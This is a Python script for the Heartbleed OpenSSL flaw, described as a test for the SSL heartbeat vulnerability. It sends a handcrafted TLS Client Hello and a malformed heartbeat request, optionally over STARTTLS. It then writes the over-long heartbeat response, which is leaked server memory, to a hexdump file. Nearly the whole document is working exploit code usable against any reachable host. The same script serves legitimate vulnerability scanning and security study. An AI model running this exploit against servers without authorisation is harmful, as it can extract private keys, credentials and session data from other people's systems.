# Usage: python heartbleed.py <host>

import sys
import struct
import socket
import time
import select
import codecs
from optparse import OptionParser

# Decoder for hexadecimal encoding
decode_hex = codecs.getdecoder('hex_codec')

# Option parser for command-line arguments
options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
options.add_option('-o', '--output', type='str', default='hexdump.txt', help='Output file for hexdump (default: hexdump.txt)')

def hex_to_bin(hex_string):
    """Convert a hex string to binary data"""
    return decode_hex(hex_string.replace(' ', '').replace('\n', ''))[0]

# Hexadecimal strings for Client Hello and Heartbeat request
CLIENT_HELLO_HEX = (
    "16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc"
    "0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04"
    "33 d4 de 00 00 66 00 02 c0 0a c0 22 c0 21 00 39 00 38 00 88"
    "00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16"
    "00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32"
    "00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11"
    "c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11"
    "00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02"
    "00 0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09"
    "00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05"
    "00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00"
    "00 0f 00 01 01"
)
# 18 - heartbeat , 03 02 - TLS 1.1 , 00 03 - length , 01 - message type , 40 00 - payload
# The server will return the payload in the heartbeat response without checking == length
HEARTBEAT_REQUEST_HEX = (
    "18 03 02 00 03"
    "01 40 00"
)

client_hello = hex_to_bin(CLIENT_HELLO_HEX)
heartbeat_request = hex_to_bin(HEARTBEAT_REQUEST_HEX)

def hexdump(data, output_file):
    """Save a hexdump of the given binary data to a file"""
    with open(output_file, 'w') as f:
        for i in range(0, len(data), 16):
            line = data[i:i + 16]
            hex_data = ' '.join(f'{byte:02X}' for byte in line)
            ascii_data = ''.join(chr(byte) if 32 <= byte <= 126 else '.' for byte in line)
            f.write(f'  {i:04x}: {hex_data:<48} {ascii_data}\n')
        f.write('\n')

def recvall(sock, length, timeout=5):
    """Receive the specified length of data from the socket"""
    end_time = time.time() + timeout
    received_data = b''
    while len(received_data) < length:
        remaining_time = end_time - time.time()
        if remaining_time <= 0:
            return None
        ready = select.select([sock], [], [], remaining_time)
        if sock in ready[0]:
            data = sock.recv(length - len(received_data))
            if not data:
                return None
            received_data += data
    return received_data

def receive_message(sock):
    """Receive a message from the socket"""
    header = recvall(sock, 5)
    if not header:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None

    message_type, version, length = struct.unpack('>BHH', header)
    print(f"message_type {message_type}, version {version}, length {length}")
    payload = recvall(sock, length, 10)
    if not payload:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None

    print(f'... received message: type = {message_type}, version = {version:04x}, length = {len(payload)}')
    return message_type, version, payload

def send_heartbeat(sock, output_file):
    """Send a heartbeat request and check for vulnerability"""
    sock.send(heartbeat_request)
    while True:
        message_type, version, payload = receive_message(sock)
        if message_type is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False
        if message_type == 24:
            print('Received heartbeat response:')
            hexdump(payload, output_file)
            if len(payload) > 3:
                print('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return True
        if message_type == 21:
            print('Received alert:')
            hexdump(payload, output_file)
            print('Server returned error, likely not vulnerable')
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    server = args[0]
    port = opts.port
    output_file = opts.output

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        print('Connecting...')
        sock.connect((server, port))

        if opts.starttls:
            response = sock.recv(4096)
            if opts.debug:
                print(response)
            sock.send(b'ehlo starttlstest\n')
            response = sock.recv(1024)
            if opts.debug:
                print(response)
            if b'STARTTLS' not in response:
                if opts.debug:
                    print(response)
                print('STARTTLS not supported...')
                sys.exit(0)
            sock.send(b'starttls\n')
            response = sock.recv(1024)

        print('Sending Client Hello...')
        sock.send(client_hello)
        print('Waiting for Server Hello...')
        while True:
            message_type, version, payload = receive_message(sock)
            if message_type is None:
                print('Server closed connection without sending Server Hello.')
                return
            if message_type == 22 and payload[0] == 0x0E:
                break

        print('Sending heartbeat request...')
        send_heartbeat(sock, output_file)

if __name__ == '__main__':
    main()
